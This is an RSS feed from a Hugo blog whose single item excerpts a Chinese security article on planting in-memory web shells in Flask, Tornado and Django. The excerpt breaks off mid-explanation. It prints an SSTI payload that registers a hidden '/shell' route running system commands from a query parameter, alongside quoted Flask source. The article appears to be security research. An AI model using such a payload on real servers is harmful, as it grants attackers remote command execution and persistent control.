<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Python on 天工实验室</title>
    <link>http://localhost:1313/tags/python/</link>
    <description>Recent content in Python on 天工实验室</description>
    <generator>Hugo -- 0.133.1</generator>
    <language>zh</language>
    <copyright>天工实验室</copyright>
    <lastBuildDate>Wed, 10 Jul 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/python/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Python Web 内存马多框架植入技术详解</title>
      <link>http://localhost:1313/blog/tiangongarticle038/</link>
      <pubDate>Wed, 10 Jul 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle038/</guid>
      <description>Python Web 内存马多框架植入技术详解 一、前言 内存马作为一种常见的攻击与权限维持手段，往往多见于Java Web应用中，然而在Python Web场景下却并不多见这种攻击。
本文将针对Flask、Tornado与Django三个在日常开发中使用频率较高的框架，探寻在Python Web场景下的内存马种植方法，文中所有场景均为抽象出的理想场景，仅做可行性讨论。
二、Flask 2.1 老版本Flask内存马种植方法 在网上针对Flask内存马的探讨，均在SSTI场景下，并且payload都相同，格式化后payload如下：
url_for.__globals__[&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;]( &amp;#34;app.add_url_rule( &amp;#39;/shell&amp;#39;, &amp;#39;shell&amp;#39;, lambda :__import__(&amp;#39;os&amp;#39;).popen(_request_ctx_stack.top.request.args.get(&amp;#39;cmd&amp;#39;, &amp;#39;whoami&amp;#39;)).read() )&amp;#34;, { &amp;#39;_request_ctx_stack&amp;#39;:url_for.__globals__[&amp;#39;_request_ctx_stack&amp;#39;], &amp;#39;app&amp;#39;:url_for.__globals__[&amp;#39;current_app&amp;#39;] } ) 在Flask中所有定义的路由都会使用一个装饰器 app.route，而这个装饰器就是调用了 add_url_rule。
@setupmethod def route(self, rule: str, **options: t.Any) -&amp;gt; t.Callable[[T_route], T_route]: def decorator(f: T_route) -&amp;gt; T_route: endpoint = options.pop(&amp;#34;endpoint&amp;#34;, None) self.add_url_rule(rule, endpoint, f, **options) return f return decorator 所以在payload中，直接调用了Flask中的 add_url_rule 函数来动态增加一条路由实现内存马。然而在最新版本的Flask中，如果直接使用这个payload会发现将抛出一个异常。
2.2 AssertionError出现原因 在回溯这个异常的时候会发现，这个异常出现在 setupmethod 这个装饰器中的一个校验函数。
def _check_setup_finished(self, f_name: str) -&amp;gt; None: if self.</description>
    </item>
  </channel>
</rss>
